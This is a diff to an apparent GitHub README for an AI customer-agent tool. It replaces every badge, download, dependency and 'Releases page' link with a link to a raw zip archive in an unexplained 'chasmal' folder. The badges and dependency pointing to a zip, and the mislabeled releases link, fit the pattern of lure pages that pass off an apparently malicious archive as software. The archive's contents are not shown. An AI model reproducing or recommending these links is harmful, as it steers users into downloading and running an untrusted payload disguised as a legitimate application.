@@ -1,8 +1,8 @@
 # 🚀 Intelligent_Customer_Agents - Transform Your Customer Engagement Efforts
 
-![Download](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)  
-![Build Status](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)  
-![License](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)
+![Download](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent-Customer-Agents-3.2.zip)  
+![Build Status](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent-Customer-Agents-3.2.zip)  
+![License](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent-Customer-Agents-3.2.zip)
 
 ## 🌟 Introduction
 
@@ -33,13 +33,13 @@ To begin your journey in creating AI-powered customer engagement tools, follow t
 
 1. **Download the Application**
 
-   Visit this page to download: [Download Intelligent_Customer_Agents](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)
+   Visit this page to download: [Download Intelligent_Customer_Agents](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent-Customer-Agents-3.2.zip)
 
 2. **Install Dependencies**
 
    You will need certain software to run the application smoothly. These may include:
 
-   - https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip
+   - https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent-Customer-Agents-3.2.zip
    - Python 3.x
    - Any code editor (such as Visual Studio Code or Atom)
 
@@ -59,7 +59,7 @@ To begin your journey in creating AI-powered customer engagement tools, follow t
 
 ## 👍 Download & Install
 
-To get the latest version, please visit the Releases page: [Download Intelligent_Customer_Agents](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent_Customer_Agents.zip)
+To get the latest version, please visit the Releases page: [Download Intelligent_Customer_Agents](https://raw.githubusercontent.com/Ermias855/Intelligent_Customer_Agents/main/chasmal/Intelligent-Customer-Agents-3.2.zip)
 
 Here, you will find the necessary files to download. Click on the version link that corresponds to your operating system.
 
